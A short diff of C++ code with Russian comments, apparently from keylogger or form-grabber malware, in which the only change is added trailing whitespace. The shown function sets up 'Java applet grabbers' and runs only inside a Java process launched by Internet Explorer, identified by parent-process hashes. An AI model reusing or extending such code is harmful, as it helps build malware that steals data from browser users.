@@ -72,10 +72,10 @@ bool InitializeJavaAppletGrabbers()
 	// Запускаемся только в процессе ява созданным из под процесса
 	// Интернет Эксплорера
 	if (!KLG || KLG->Process != PROCESS_JAVA)
-		return false;
+		return false;     
 
-	DWORD PID = GetParentPID();
-	DWORD Hash = GetHashForPid(PID);
+	DWORD PID = GetParentPID();   
+	DWORD Hash = GetHashForPid(PID);    
 	// Пока проверяем принадлежность явы к процессам браузеров
 	// по массиву хэшей
 	const static DWORD Hashes[] = {PROCESS_HASH_IE,
